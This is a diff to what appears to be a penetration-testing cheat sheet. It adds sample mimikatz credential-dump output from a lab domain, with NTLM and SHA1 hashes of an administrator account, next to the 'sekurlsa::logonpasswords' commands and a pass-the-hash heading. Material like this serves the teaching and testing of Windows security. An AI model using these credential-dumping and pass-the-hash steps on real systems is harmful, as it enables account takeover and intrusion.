@@ -37,6 +37,36 @@ mimikatz # privilege::debug
 mimikatz # sekurlsa::logonpasswords
 ```
 
+```
+Authentication Id : 0 ; 646260 (00000000:0009dc74)
+ Session           : RemoteInteractive from 2
+ User Name         : adsadministrator
+ Domain            : ADSECLAB
+ Logon Server      : ADSDC03
+ Logon Time        : 11/27/2015 11:41:27 AM
+ SID               : S-1-5-21-1581655573-3923512380-696647894-500
+ msv :
+ [00000003] Primary
+ * Username : ADSAdministrator
+ * Domain   : ADSECLAB
+ * NTLM     : 5164b7a0fda365d56739954bbbc23835
+ * SHA1     : f8db297cb2ae403f8915675cebe79643d0d3b09f
+ [00010000] CredentialKeys
+ * NTLM     : 5164b7a0fda365d56739954bbbc23835
+ * SHA1     : f8db297cb2ae403f8915675cebe79643d0d3b09f
+ tspkg :
+ wdigest :
+ * Username : ADSAdministrator
+ * Domain   : ADSECLAB
+ * Password : (null)
+ kerberos :
+ * Username : adsadministrator
+ * Domain   : LAB.ADSECURITY.ORG
+ * Password : (null)
+ ssp :   KO
+ credman :
+```
+
 #### Pass the Hash with Mimikatz
 
 If you can’t crack the hash of a local administrator account you can instead just inject the hash into memory to gain the privileges:
